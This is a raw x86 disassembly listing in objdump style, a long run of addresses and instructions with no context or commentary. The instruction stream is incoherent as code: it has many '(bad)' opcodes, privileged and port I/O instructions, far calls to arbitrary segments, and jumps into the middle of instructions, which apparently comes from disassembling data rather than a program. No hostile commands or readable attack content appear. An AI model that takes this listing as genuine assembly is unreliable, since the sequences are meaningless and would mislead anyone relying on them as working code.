  4a2a02:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a2a03:	jne    0x4a2a18
  4a2a05:	lahf   
  4a2a06:	xor    al,0x6
  4a2a08:	fidiv  WORD PTR [esi-0x2e836f67]
  4a2a0e:	jmp    0x4a2a31
  4a2a10:	repz sbb esp,DWORD PTR [edi+0x80ce062]
  4a2a17:	std    
  4a2a18:	jns    0x4a2a52
  4a2a1a:	pop    ebx
  4a2a1b:	clc    
  4a2a1c:	pop    es
  4a2a1d:	popa   
  4a2a1e:	push   ss
  4a2a1f:	retf   
  4a2a20:	scas   al,BYTE PTR es:[edi]
  4a2a21:	(bad)  
  4a2a22:	jmp    DWORD PTR [edi-0x54]
  4a2a25:	sub    BYTE PTR [ebx+eiz*2-0x24b9b754],ch
  4a2a2c:	sbb    BYTE PTR [ecx],0x2b
  4a2a2f:	pusha  
  4a2a30:	ror    DWORD PTR [esi-0x4e],1
  4a2a33:	call   0x371d:0xa080c2f1
  4a2a3a:	mov    ds:0x78cd1322,eax
  4a2a3f:	sub    esi,DWORD PTR [ebp-0x10]
  4a2a42:	popf   
  4a2a43:	retf   
  4a2a44:	mov    dl,0x41
  4a2a46:	and    al,0x18
  4a2a48:	je     0x4a2a18
  4a2a4a:	jbe    0x4a29d0
  4a2a4c:	or     dl,cl
  4a2a4e:	loope  0x4a2a40
  4a2a50:	test   eax,0x110c2c57
  4a2a55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a2a56:	adc    al,0x5f
  4a2a58:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a2a59:	mov    al,0xa1
  4a2a5b:	pusha  
  4a2a5c:	jle    0x4a2a28
  4a2a5e:	mov    ch,bl
  4a2a60:	setg   BYTE PTR [ebx-0xc]
  4a2a64:	rcr    BYTE PTR [ebx],0x2f
  4a2a67:	leave  
  4a2a68:	push   esp
  4a2a69:	arpl   dx,ax
  4a2a6b:	inc    edi
  4a2a6c:	ja     0x4a2a14
  4a2a6e:	ret    0xa6b
  4a2a71:	inc    esi
  4a2a72:	cmp    DWORD PTR [esi],ecx
  4a2a74:	test   DWORD PTR [edi-0x111e26ca],edx
  4a2a7a:	sub    esi,edx
  4a2a7c:	push   ebp
  4a2a7d:	inc    edx
  4a2a7e:	ja     0x4a2a51
  4a2a80:	jle    0x4a2a52
  4a2a82:	mov    ebx,eax
  4a2a84:	aad    0x88
  4a2a86:	cmp    BYTE PTR [esi+eax*1+0x44],al
  4a2a8a:	test   BYTE PTR [ecx+ebp*2-0x29],dh
  4a2a8e:	rol    BYTE PTR [eax-0x7d7ae29e],0xe0
  4a2a95:	pop    ds
  4a2a96:	ss mov bl,0x52
  4a2a99:	sub    al,0x41
  4a2a9b:	inc    esi
  4a2a9c:	retf   
  4a2a9d:	jl     0x4a2a7f
  4a2a9f:	jmp    0x4a2abd
  4a2aa1:	or     eax,0x616e0bc3
  4a2aa6:	inc    edi
  4a2aa7:	aaa    
  4a2aa8:	arpl   WORD PTR [edi+esi*2+0x58],di
  4a2aac:	loop   0x4a2a71
  4a2aae:	mov    dh,0x0
  4a2ab0:	jb     0x4a2aec
  4a2ab2:	push   esp
  4a2ab3:	pop    edx
  4a2ab4:	hlt    
  4a2ab5:	adc    al,BYTE PTR [edi+0x911870]
  4a2abb:	jp     0x4a2a96
  4a2abd:	loope  0x4a2a3f
  4a2abf:	inc    edi
  4a2ac0:	dec    esi
  4a2ac1:	jne    0x4a2a59
  4a2ac3:	dec    ebp
  4a2ac4:	jae    0x4a2a93
  4a2ac6:	push   0x6beae38e
  4a2acb:	push   ebp
  4a2acc:	mov    edi,edx
  4a2ace:	add    eax,DWORD PTR es:0x89dd3e5c
  4a2ad5:	cmp    BYTE PTR [esi+0x12],al
  4a2ad8:	les    eax,FWORD PTR [ebx+0x160cdc1b]
  4a2ade:	push   eax
  4a2adf:	dec    esp
  4a2ae0:	(bad)  
  4a2ae1:	retf   0x9170
  4a2ae4:	add    eax,0xda7e7eef
  4a2ae9:	cmp    edx,eax
  4a2aeb:	shr    dh,cl
  4a2aed:	aam    0x32
  4a2aef:	sbb    bh,BYTE PTR [edx+esi*4]
  4a2af2:	pusha  
  4a2af3:	(bad)  
  4a2af4:	fsubp  st(2),st
  4a2af6:	inc    ecx
  4a2af7:	sar    BYTE PTR [ebp+0x36],1
  4a2afa:	fst    DWORD PTR ds:0x7606db8c
  4a2b00:	pop    edx
  4a2b01:	enter  0x4236,0x46
  4a2b05:	inc    eax
  4a2b06:	pop    es
  4a2b07:	cmp    DWORD PTR [ebp+0x50],eax
  4a2b0a:	callw  0x8dd7
  4a2b0e:	ss xchg edi,eax
  4a2b10:	aam    0x8c
  4a2b12:	nop
  4a2b13:	inc    ebx
  4a2b14:	and    al,0xb1
  4a2b16:	dec    esp
  4a2b17:	jb     0x4a2b41
  4a2b19:	fs dec ebx
  4a2b1b:	dec    ebp
  4a2b1c:	dec    ebx
  4a2b1d:	ss (bad) 
  4a2b1f:	or     ax,0xe40a
  4a2b23:	push   ebp
  4a2b24:	(bad)  
  4a2b25:	data16 (bad) 
  4a2b27:	push   ds
  4a2b28:	or     DWORD PTR [ebx],ebx
  4a2b2a:	in     eax,dx
  4a2b2b:	je     0x4a2b63
  4a2b2d:	mov    ds:0x1c04f307,eax
  4a2b32:	cwde   
  4a2b33:	jmp    0x9842dbd
  4a2b38:	or     bl,BYTE PTR [eax+eax*4]
  4a2b3b:	aad    0x81
  4a2b3d:	(bad)  
  4a2b3e:	jb     0x4a2ac5
  4a2b40:	push   ds
  4a2b41:	shr    DWORD PTR [ecx-0x1864c32e],cl
  4a2b47:	scas   eax,DWORD PTR es:[edi]
  4a2b48:	inc    eax
  4a2b49:	sar    ch,1
  4a2b4b:	rcl    BYTE PTR [ebp-0x69],cl
  4a2b4e:	inc    edx
  4a2b4f:	ret    0x1695
  4a2b52:	lods   eax,DWORD PTR ds:[esi]
  4a2b53:	adc    ecx,esi
  4a2b55:	mov    bl,0xf0
  4a2b57:	lods   eax,DWORD PTR ds:[esi]
  4a2b58:	rcr    DWORD PTR [edi],0x90
  4a2b5b:	imul   edx,ecx,0x2a22d0f
  4a2b61:	lods   al,BYTE PTR ds:[esi]
  4a2b62:	xor    ecx,ecx
  4a2b64:	xchg   esp,eax
  4a2b65:	lods   eax,DWORD PTR ds:[esi]
  4a2b66:	test   BYTE PTR [edx],bl
  4a2b68:	out    dx,al
  4a2b69:	xor    ecx,DWORD PTR [edi]
  4a2b6b:	xchg   esp,eax
  4a2b6c:	inc    ebx
  4a2b6d:	pop    esi
  4a2b6e:	mov    gs,ebx
  4a2b70:	ins    DWORD PTR es:[edi],dx
  4a2b71:	cmp    esp,eax
  4a2b73:	cmp    BYTE PTR ds:0x4e302ec1,0x57
  4a2b7a:	mov    eax,0x2dbdb9bb
  4a2b7f:	push   ss
  4a2b80:	fsubr  st,st(3)
  4a2b82:	dec    ebx
  4a2b83:	mov    ecx,0xebd94d33
  4a2b88:	inc    edx
  4a2b89:	cdq    
  4a2b8a:	fild   WORD PTR [esi+0x30]
  4a2b8d:	pop    ebx
  4a2b8e:	es pushf 
  4a2b90:	xor    eax,0xeb903e90
  4a2b95:	daa    
  4a2b96:	cmp    esi,DWORD PTR [eax+0x70]
  4a2b99:	loopne 0x4a2b1e
  4a2b9b:	rcl    esp,0x96
  4a2b9e:	sub    cl,BYTE PTR [edi+0x1be580a5]
  4a2ba4:	push   es
  4a2ba5:	mov    DWORD PTR [esi+ecx*1-0x25],ebp
  4a2ba9:	cmp    eax,0xb90875f0
  4a2bae:	xchg   BYTE PTR [esi],dl
  4a2bb0:	dec    esp
  4a2bb1:	adc    eax,DWORD PTR [ebx+0x13]
  4a2bb4:	or     DWORD PTR [ebp+0x4ea45a10],ebx
  4a2bba:	add    ebp,DWORD PTR [ebp+0x32]
  4a2bbd:	push   edi
  4a2bbe:	sbb    eax,0x9891dc9
  4a2bc3:	dec    esi
  4a2bc4:	call   0xf8be:0x4234986a
  4a2bcb:	inc    esp
  4a2bcc:	lock dec esi
  4a2bce:	jne    0x4a2bb1
  4a2bd0:	adc    edx,DWORD PTR [ebp-0x706e42ba]
  4a2bd6:	adc    al,0x81
  4a2bd8:	pushf  
  4a2bd9:	dec    eax
  4a2bda:	xchg   ecx,eax
  4a2bdb:	(bad)  
  4a2bdc:	clc    
  4a2bdd:	sbb    BYTE PTR ds:0x3b47c082,0x39
  4a2be4:	mov    gs,WORD PTR [ebx-0x4f23b055]
  4a2bea:	xor    edi,edi
  4a2bec:	stc    
  4a2bed:	dec    edx
  4a2bee:	pop    es
  4a2bef:	jl     0x4a2c29
  4a2bf1:	ror    BYTE PTR [esi+0x3e2d06eb],cl
  4a2bf7:	jl     0x4a2c21
  4a2bf9:	xor    eax,DWORD PTR [esi]
  4a2bfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2bfc:	sub    eax,0x6439d464
  4a2c01:	jge    0x4a2c81
  4a2c03:	shl    BYTE PTR [edx],cl
  4a2c05:	add    al,0xa4
  4a2c07:	push   edx
  4a2c08:	xchg   ebp,eax
  4a2c09:	loope  0x4a2c18
  4a2c0b:	fdiv   DWORD PTR [ecx-0x42]
  4a2c0e:	shl    BYTE PTR [ebx],1
  4a2c10:	dec    ecx
  4a2c11:	ds stc 
  4a2c13:	fmul   QWORD PTR [ebp+0x2c5aed74]
  4a2c19:	xlat   BYTE PTR ds:[ebx]
  4a2c1a:	loop   0x4a2c51
  4a2c1c:	jge    0x2c7a4062
  4a2c22:	aas    
  4a2c23:	jl     0x4a2c2e
  4a2c25:	jmp    0x4a2c42
  4a2c27:	add    ecx,ebp
  4a2c29:	test   DWORD PTR [edi+0x18],ebp
  4a2c2c:	retf   0x7de2
  4a2c2f:	arpl   cx,cx
  4a2c31:	xchg   ecx,eax
  4a2c32:	push   edi
  4a2c33:	leave  
  4a2c34:	enter  0x93b8,0x11
  4a2c38:	dec    eax
  4a2c39:	rcl    BYTE PTR [esi+0x21],cl
  4a2c3c:	xor    DWORD PTR [ebx+eax*1+0x21],eax
  4a2c40:	pop    ebp
  4a2c41:	push   0x5d45c957
  4a2c46:	add    ecx,DWORD PTR [edx]
  4a2c48:	mov    cl,0x51
  4a2c4a:	test   ecx,ecx
  4a2c4c:	push   edi
  4a2c4d:	fisubr DWORD PTR [edx+0x6fe36db0]
  4a2c53:	leave  
  4a2c54:	gs jno 0x4a2c65
  4a2c57:	cdq    
  4a2c58:	lods   eax,DWORD PTR ds:[esi]
  4a2c59:	jge    0x4a2c60
  4a2c5b:	push   es
  4a2c5c:	cld    
  4a2c5d:	jo     0x4a2bf7
  4a2c5f:	pop    esp
  4a2c60:	add    ecx,DWORD PTR [edx]
  4a2c62:	je     0x4a2c06
  4a2c64:	je     0x4a2c90
  4a2c66:	add    edx,DWORD PTR [ebx*2-0x7c0f9f97]
  4a2c6d:	fld    DWORD PTR cs:[edi+eiz*4+0x17055a03]
  4a2c75:	xchg   ebx,eax
  4a2c76:	adc    DWORD PTR [ebx+edx*1],ecx
  4a2c79:	and    DWORD PTR [edi-0x22],ecx
  4a2c7c:	mov    bh,0x1d
  4a2c7e:	xor    DWORD PTR [edx-0x31],edx
  4a2c81:	jne    0x4a2cb5
  4a2c83:	icebp  
  4a2c84:	cld    
  4a2c85:	mov    al,BYTE PTR [edi+0x24]
  4a2c88:	nop
  4a2c89:	mov    edx,esi
  4a2c8b:	dec    esi
  4a2c8c:	cmp    edx,DWORD PTR [ebp-0x36]
  4a2c8f:	in     al,0x6b
  4a2c91:	sbb    BYTE PTR [edi-0x5],dh
  4a2c94:	and    al,0xc0
  4a2c96:	cmp    al,0x3e
  4a2c98:	dec    esi
  4a2c99:	dec    DWORD PTR [esi-0x5e]
  4a2c9c:	or     DWORD PTR [ecx-0x3e],esp
  4a2c9f:	out    0xe1,eax
  4a2ca1:	cmp    edx,eax
  4a2ca3:	aaa    
  4a2ca4:	pusha  
  4a2ca5:	mov    bh,0xeb
  4a2ca7:	ret    0x397d
  4a2caa:	out    dx,al
  4a2cab:	sbb    BYTE PTR [edi],al
  4a2cad:	mov    esi,0x257401f0
  4a2cb2:	inc    eax
  4a2cb3:	inc    esi
  4a2cb4:	push   edx
  4a2cb5:	in     eax,0x1b
  4a2cb7:	adc    eax,0x5411e4f2
  4a2cbc:	xor    BYTE PTR [ecx-0x265f8f32],cl
  4a2cc2:	and    BYTE PTR [ecx+0x1b4e46a4],ah
  4a2cc8:	adc    BYTE PTR [ebp-0x10],0x48
  4a2ccc:	mul    edi
  4a2cce:	(bad)  
  4a2cd0:	push   eax
  4a2cd1:	jne    0x4a2c8b
  4a2cd3:	xor    DWORD PTR [edx],edx
  4a2cd5:	lods   eax,DWORD PTR ds:[esi]
  4a2cd6:	pop    eax
  4a2cd7:	ffree  st(1)
  4a2cd9:	cmp    eax,0xe20ae440
  4a2cde:	add    esi,edx
  4a2ce0:	inc    ebp
  4a2ce1:	out    dx,eax
  4a2ce2:	scas   eax,DWORD PTR es:[edi]
  4a2ce3:	sahf   
  4a2ce4:	ds push ds
  4a2ce6:	shr    ch,1
  4a2ce8:	popa   
  4a2ce9:	fist   WORD PTR [ebp-0x6a836556]
  4a2cef:	cdq    
  4a2cf0:	and    dh,BYTE PTR [ecx]
  4a2cf2:	por    mm2,QWORD PTR [ebp-0x6d]
  4a2cf6:	retf   
  4a2cf7:	fisttp QWORD PTR [ebp+0x8]
  4a2cfa:	jne    0x4a2d2a
  4a2cfc:	pop    es
  4a2cfd:	test   DWORD PTR [ebp+0x2e],0x46502df
  4a2d04:	jne    0x4a2d3d
  4a2d06:	add    esi,DWORD PTR [ebp+0x97047bd]
  4a2d0c:	inc    eax
  4a2d0d:	and    esp,DWORD PTR [esi+edx*1]
  4a2d10:	imul   ebx,DWORD PTR [eax-0x42],0xa
  4a2d14:	rcl    BYTE PTR [ebx],1
  4a2d16:	(bad)  
  4a2d17:	adc    DWORD PTR [eax],esi
  4a2d19:	pop    eax
  4a2d1a:	xchg   ebp,eax
  4a2d1b:	mov    ebx,0xca03557e
  4a2d20:	add    ecx,ebx
  4a2d22:	sub    al,0xdf
  4a2d24:	in     al,0x87
  4a2d26:	sub    al,BYTE PTR [esi+0x2b]
  4a2d29:	pop    ecx
  4a2d2a:	xchg   esp,eax
  4a2d2b:	cmp    al,0x63
  4a2d2d:	fisttp WORD PTR [edi+0x73]
  4a2d30:	xor    eax,0x4dfe2f92
  4a2d35:	ror    esp,0x39
  4a2d38:	mov    ecx,0x3c7e20e4
  4a2d3d:	ret    
  4a2d3e:	rcl    DWORD PTR [eax],0xe7
  4a2d41:	nop
  4a2d42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a2d43:	sub    DWORD PTR [edx-0x37f291fc],edi
  4a2d49:	jno    0x4a2dc2
  4a2d4b:	ficom  WORD PTR [edx]
  4a2d4d:	and    esi,DWORD PTR [eax+edx*1-0x51]
  4a2d51:	mov    ch,0x97
  4a2d54:	or     al,0x84
  4a2d56:	push   ds
  4a2d57:	enter  0x20bb,0x96
  4a2d5b:	xchg   ecx,eax
  4a2d5c:	inc    edx
  4a2d5d:	add    ebx,DWORD PTR [ebx-0x75]
  4a2d60:	adc    al,0x29
  4a2d62:	into   
  4a2d63:	daa    
  4a2d64:	inc    ebx
  4a2d65:	pop    ebx
  4a2d66:	push   ebp
  4a2d67:	js     0x4a2d9e
  4a2d69:	in     al,0x3
  4a2d6b:	div    DWORD PTR [esi+eiz*1+0x33]
  4a2d6f:	inc    ebx
  4a2d70:	mov    edx,0x6d553b15
  4a2d75:	add    al,0xab
  4a2d77:	jbe    0x4a2cfe
  4a2d79:	push   ebp
  4a2d7a:	cmc    
  4a2d7b:	cmp    DWORD PTR [ebp+0x5b],esp
  4a2d7e:	arpl   WORD PTR [eax+0x10],si
  4a2d81:	fnstcw WORD PTR [edi+0x6ad54539]
  4a2d87:	lods   al,BYTE PTR ds:[esi]
  4a2d88:	push   esi
  4a2d89:	ror    ah,1
  4a2d8b:	xor    eax,edx
  4a2d8d:	in     al,0xd3
  4a2d8f:	sbb    al,0x49
  4a2d91:	lock push edi
  4a2d93:	push   edi
  4a2d94:	add    BYTE PTR ds:0x1c9cd290,ch
  4a2d9a:	imul   ecx,ebx,0x57a02024
  4a2da0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a2da1:	pop    esp
  4a2da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a2da3:	and    ah,bl
  4a2da5:	sbb    BYTE PTR [esi-0x7746cecb],ch
  4a2dab:	das    
  4a2dac:	mov    WORD PTR [edx+0x1ee268c6],gs
  4a2db2:	call   0xdaea:0xcff44532
  4a2db9:	cmp    cl,BYTE PTR [edi+eax*8-0x680074d3]
  4a2dc0:	test   al,0xf8
  4a2dc2:	pop    esi
  4a2dc3:	ins    BYTE PTR es:[edi],dx
  4a2dc4:	in     eax,dx
  4a2dc5:	inc    esi
  4a2dc6:	push   eax
  4a2dc7:	mov    ch,BYTE PTR [ebp-0x4b4c8b5f]
  4a2dcd:	pop    edx
  4a2dce:	jo     0x4a2df7
  4a2dd0:	(bad)  
  4a2dd1:	shl    BYTE PTR [edx+0x7d],1
  4a2dd4:	xor    ebx,ebx
  4a2dd6:	adc    BYTE PTR [edx+0x685836ab],ch
  4a2ddc:	xchg   edi,eax
  4a2ddd:	and    al,0x42
  4a2ddf:	int3   
  4a2de0:	sar    DWORD PTR [ebp+ebp*8-0x35],1
  4a2de4:	sbb    BYTE PTR [ecx],bh
  4a2de6:	enter  0x3a29,0x2c
  4a2dea:	mov    ds:0xeadd41ca,eax
  4a2def:	add    al,0x7a
  4a2df2:	push   0xfffffff8
  4a2df4:	lahf   
  4a2df5:	enter  0xab57,0xae
  4a2df9:	(bad)  
  4a2dfb:	mov    bh,0x42
  4a2dfd:	jl     0x4a2e2a
  4a2dff:	adc    eax,0x4ba83f62
  4a2e04:	sub    dh,al
  4a2e06:	retf   0xd1aa
  4a2e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2e0a:	fsub   st(4),st
  4a2e0c:	mov    DWORD PTR [ecx-0x71],ecx
  4a2e0f:	rol    DWORD PTR [ebp+0x240b2699],1
  4a2e15:	add    BYTE PTR [edi],ah
  4a2e17:	pop    ecx
  4a2e18:	les    ecx,FWORD PTR ds:0x6e7dd6e1
  4a2e1e:	cmp    BYTE PTR [ebx],0x40
  4a2e21:	push   esi
  4a2e22:	push   edx
  4a2e23:	pop    esi
  4a2e24:	mov    edi,0x629d60bd
  4a2e29:	push   ebp
  4a2e2a:	sub    DWORD PTR [edx],ebp
  4a2e2c:	cmc    
  4a2e2d:	cwde   
  4a2e2e:	mov    ecx,0x63eb4332
  4a2e33:	push   esp
  4a2e34:	mov    BYTE PTR [ebx+0x1ae82952],bl
  4a2e3a:	dec    edx
  4a2e3b:	push   esp
  4a2e3c:	sahf   
  4a2e3d:	and    esp,DWORD PTR ds:0x4df0e986
  4a2e43:	dec    eax
  4a2e44:	dec    esp
  4a2e45:	popa   
  4a2e46:	sub    DWORD PTR [eax],eax
  4a2e48:	lahf   
  4a2e49:	sub    al,0xe2
  4a2e4b:	ja     0x4a2e57
  4a2e4d:	clc    
  4a2e4e:	and    esi,ecx
  4a2e50:	cmc    
  4a2e51:	jb     0x4a2e7d
  4a2e53:	lea    eax,[ecx-0x39]
  4a2e56:	adc    BYTE PTR ds:0xa010a700,0x89
  4a2e5d:	adc    ah,BYTE PTR [eax]
  4a2e5f:	add    al,0xb
  4a2e61:	jnp    0x4a2e6d
  4a2e63:	sub    al,0x6b
  4a2e65:	sbb    ah,dl
  4a2e67:	hlt    
  4a2e68:	mov    edx,0x2a035579
  4a2e6d:	pop    edx
  4a2e6e:	inc    esi
  4a2e6f:	push   ebp
  4a2e70:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a2e71:	je     0x4a2e3c
  4a2e73:	add    BYTE PTR [ecx+0xe],al
  4a2e76:	icebp  
  4a2e77:	xor    DWORD PTR [edx+0x1f],ebx
  4a2e7a:	cli    
  4a2e7b:	mov    esp,DWORD PTR [eax+0x30f580a]
  4a2e81:	mov    al,0x51
  4a2e83:	add    dh,al
  4a2e85:	cmp    eax,DWORD PTR [eax]
  4a2e87:	sub    al,0xe4
  4a2e89:	adc    eax,0xe6856600
  4a2e8e:	inc    edi
  4a2e8f:	adc    al,0xe
  4a2e91:	pop    ss
  4a2e92:	jno    0x4a2ecb
  4a2e94:	jno    0x4a2ec2
  4a2e96:	xor    bh,bh
  4a2e98:	outs   dx,DWORD PTR es:[esi]
  4a2e9a:	inc    edi
  4a2e9b:	shl    cl,0x11
  4a2e9e:	les    ebp,FWORD PTR [ecx]
  4a2ea0:	jmp    0xd5d2e6f3
  4a2ea5:	(bad)  
  4a2ea6:	jmp    0x4a2ecf
  4a2ea8:	mov    bl,0x7b
  4a2eaa:	mov    ah,0x37
  4a2eac:	rcr    DWORD PTR [ecx+eiz*4+0x16de4629],1
  4a2eb3:	xchg   ebp,eax
  4a2eb4:	loopne 0x4a2e7e
  4a2eb6:	push   0x14e546f1
  4a2ebb:	pop    edi
  4a2ebc:	xor    eax,0x67737602
  4a2ec1:	push   es
  4a2ec2:	daa    
  4a2ec3:	jb     0x4a2eb7
  4a2ec5:	push   0x3a
  4a2ec7:	adc    BYTE PTR [eax+ebx*8+0x0],bh
  4a2ecb:	jle    0x4a2e4e
  4a2ecd:	jb     0x4a2e76
  4a2ecf:	jns    0x4a2ef8
  4a2ed1:	or     BYTE PTR ds:0x13b6090c,0x15
  4a2ed8:	les    ebx,FWORD PTR [edx+edx*1-0x6eeb8445]
  4a2edf:	xor    DWORD PTR [ebp+0x7f0e73f0],ecx
  4a2ee5:	adc    eax,0x91ef48e7
  4a2eea:	inc    ebx
  4a2eeb:	xlat   BYTE PTR ds:[ebx]
  4a2eec:	test   DWORD PTR [esi-0x2e1ff13f],edi
  4a2ef2:	mov    esi,0xf103ec1e
  4a2ef7:	lods   eax,DWORD PTR ds:[esi]
  4a2ef8:	sub    DWORD PTR ds:0xa19805eb,ecx
  4a2efe:	in     eax,0x31
  4a2f00:	hlt    
  4a2f01:	and    BYTE PTR [ecx],bh
  4a2f03:	test   ah,cl
  4a2f05:	fwait
  4a2f06:	xlat   BYTE PTR ds:[ebx]
  4a2f07:	fwait
  4a2f08:	cmp    al,0xb4
  4a2f0a:	push   edx
  4a2f0b:	add    al,0xf2
  4a2f0d:	fwait
  4a2f0e:	cmp    al,0xfa
  4a2f10:	jge    0x4a2f49
  4a2f12:	hlt    
  4a2f13:	push   esi
  4a2f14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a2f15:	or     eax,0x17742677
  4a2f1a:	push   cs
  4a2f1b:	or     dh,BYTE PTR [edx+eax*2-0xf]
  4a2f1f:	xor    DWORD PTR [edx-0x30],ebx
  4a2f22:	push   edi
  4a2f23:	cmc    
  4a2f24:	jp     0x4a2ead
  4a2f26:	clc    
  4a2f27:	daa    
  4a2f28:	xchg   esp,eax
  4a2f29:	inc    edx
  4a2f2a:	mov    esp,DWORD PTR [edi]
  4a2f2c:	push   es
  4a2f2d:	cmp    ebp,DWORD PTR [edx+ebx*4]
  4a2f30:	sub    eax,0xf2017b05
  4a2f35:	inc    esi
  4a2f36:	jmp    0x4a2f5c
  4a2f38:	add    DWORD PTR [esi-0x71],0x56ec211
  4a2f3f:	jl     0x4a2f8d
  4a2f41:	add    eax,0xcf51fed8
  4a2f46:	daa    
  4a2f47:	stc    
  4a2f48:	add    ch,ah
  4a2f4a:	xchg   ebp,eax
  4a2f4b:	test   DWORD PTR [edx+0x4dd61225],esp
  4a2f51:	dec    edi
  4a2f52:	push   ds
  4a2f53:	or     eax,0xc6c5b2a6
  4a2f58:	or     ebp,DWORD PTR [edi]
  4a2f5a:	sub    ah,BYTE PTR [edi]
  4a2f5c:	xchg   edx,eax
  4a2f5d:	push   ebx
  4a2f5e:	and    BYTE PTR [edi+ebx*4+0x73049f9c],bl
  4a2f65:	push   ecx
  4a2f66:	and    BYTE PTR [ecx-0x42ba660d],al
  4a2f6c:	fwait
  4a2f6d:	cmp    ah,dl
  4a2f6f:	and    BYTE PTR [esp+ebx*1],0xa0
  4a2f73:	add    BYTE PTR [ecx+0x1ccd3cd6],dl
  4a2f79:	jno    0x4a2efe
  4a2f7b:	or     DWORD PTR [edx],edx
  4a2f7d:	addr16 xchg edi,eax
  4a2f7f:	ret    0x9a7d
  4a2f82:	and    BYTE PTR [ebp-0x15],bl
  4a2f85:	push   eax
  4a2f86:	dec    eax
  4a2f87:	stos   DWORD PTR es:[edi],eax
  4a2f88:	xchg   ecx,eax
  4a2f89:	out    0xf9,al
  4a2f8b:	mov    edx,0x84411d4e
  4a2f90:	pop    edi
  4a2f91:	and    BYTE PTR [ebx],ch
  4a2f93:	cmp    eax,0x97ee12f
  4a2f98:	sahf   
  4a2f99:	jb     0x4a2fc4
  4a2f9b:	adc    BYTE PTR [ebx-0x26f5a117],bl
  4a2fa1:	daa    
  4a2fa2:	sub    ebp,DWORD PTR [ebx+0x4c0d671a]
  4a2fa8:	lds    edx,FWORD PTR [edi+0x240ba7c2]
  4a2fae:	sub    eax,0x393c817e
  4a2fb3:	sub    BYTE PTR [edi],0xa
  4a2fb6:	cwde   
  4a2fb7:	sub    BYTE PTR [esp+ebx*4+0x369e4e48],al
  4a2fbe:	sahf   
  4a2fbf:	lds    eax,FWORD PTR ss:[ebx-0xf]
  4a2fc3:	add    eax,0x2569742e
  4a2fc8:	adc    al,0x74
  4a2fca:	pop    esi
  4a2fcb:	sbb    eax,0xb17e7907
  4a2fd0:	je     0x4a302a
  4a2fd2:	adc    eax,0x4c22d285
  4a2fd7:	test   ebx,eax
  4a2fd9:	out    dx,eax
  4a2fda:	loop   0x4a301d
  4a2fdc:	sahf   
  4a2fdd:	and    bh,BYTE PTR ds:0xd327427
  4a2fe3:	xor    al,BYTE PTR [edx-0x63a875e2]
  4a2fe9:	test   eax,0xd1c7615
  4a2fee:	test   DWORD PTR [ebx+0x79264022],edx
  4a2ff4:	inc    eax
  4a2ff5:	test   DWORD PTR [edx+eiz*1-0x61bf5872],eax
  4a2ffc:	sbb    al,0xa8
  4a2ffe:	or     BYTE PTR [ecx],dl
  4a3000:	daa    
  4a3001:	lahf   
  4a3002:	mov    ebp,0x244e40aa
  4a3007:	lahf   
  4a3008:	mov    ebp,0x4286a6cb
  4a300d:	dec    ebp
  4a300e:	sbb    BYTE PTR [eax],cl
  4a3010:	bound  esp,QWORD PTR [ecx]
  4a3012:	call   0xb3844c2
  4a3017:	jb     0x4a303b
  4a3019:	or     al,dh
  4a301b:	push   edx
  4a301c:	push   ds
  4a301d:	jmp    0x4a3035
  4a301f:	or     eax,0xd8e54f2f
  4a3024:	sub    BYTE PTR ds:0x93213a29,cl
  4a302a:	repnz in al,0x0
  4a302d:	xor    cl,bl
  4a302f:	pop    esi
  4a3030:	pop    es
  4a3031:	(bad)  
  4a3032:	and    eax,0x5392272
  4a3037:	mov    eax,ds:0xb407a107
  4a303c:	rcl    BYTE PTR [edi],0x10
  4a303f:	adc    esi,DWORD PTR [edx+eiz*1-0x71]
  4a3043:	test   BYTE PTR [edx],0xf
  4a3046:	cmp    eax,0x640dbd6d
  4a304b:	jmp    0x4a2fcd
  4a304d:	dec    esp
  4a304e:	ret    
  4a304f:	and    DWORD PTR [ebx-0x6],0x1f
  4a3053:	jg     0x4a302a
  4a3055:	dec    esi
  4a3056:	cmp    DWORD PTR [ecx+edi*1],0x2487061e
  4a305d:	mov    ds:0x9c815447,al
  4a3062:	dec    eax
  4a3063:	mov    ds:0x3d1a3347,al
  4a3068:	adc    DWORD PTR [edi+0x13],0xcb6122ae
  4a306f:	and    al,0x63
  4a3071:	cld    
  4a3072:	test   BYTE PTR [eax],0x64
  4a3075:	sbb    BYTE PTR [ecx+edx*2],cl
  4a3078:	loop   0x4a3098
  4a307a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a307b:	pop    ebp
  4a307c:	out    0x1e,al
  4a307e:	loop   0x4a3049
  4a3080:	add    edi,ebp
  4a3082:	add    al,0x58
  4a3084:	and    ecx,DWORD PTR [eax-0x6a047fc4]
  4a308a:	inc    esi
  4a308b:	xlat   BYTE PTR ds:[ebx]
  4a308c:	adc    dl,BYTE PTR [edi-0x3fc3a893]
  4a3092:	mov    al,BYTE PTR [eax+edx*1]
  4a3095:	inc    esi
  4a3096:	and    al,0x90
  4a3098:	jmp    0x84b1412b
  4a309d:	test   DWORD PTR ds:0xc17689d0,esp
  4a30a3:	fs nop
  4a30a5:	add    DWORD PTR [edx+0x18390e13],ebp
  4a30ab:	sbb    BYTE PTR ds:0x10e14e0,al
  4a30b1:	inc    ebx
  4a30b2:	je     0x4a30f8
  4a30b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a30b5:	inc    esi
  4a30b6:	pop    ebp
  4a30b7:	or     cl,dl
  4a30b9:	cmp    DWORD PTR [edx],ecx
  4a30bb:	outs   dx,BYTE PTR ds:[esi]
  4a30bc:	les    esi,FWORD PTR [ebp+eax*2-0x38]
  4a30c0:	and    ebx,DWORD PTR [ebp-0x31]
  4a30c3:	into   
  4a30c4:	and    BYTE PTR [edi],al
  4a30c6:	(bad)  
  4a30c7:	and    al,BYTE PTR ds:0x2148aa1
  4a30cd:	xchg   edx,eax
  4a30ce:	add    DWORD PTR [ecx-0x10],ebx
  4a30d1:	inc    esi
  4a30d2:	and    dl,0x1
  4a30d5:	and    al,0xf2
  4a30d7:	sbb    eax,0xc9870cf
  4a30dc:	cmp    edx,DWORD PTR [edi]
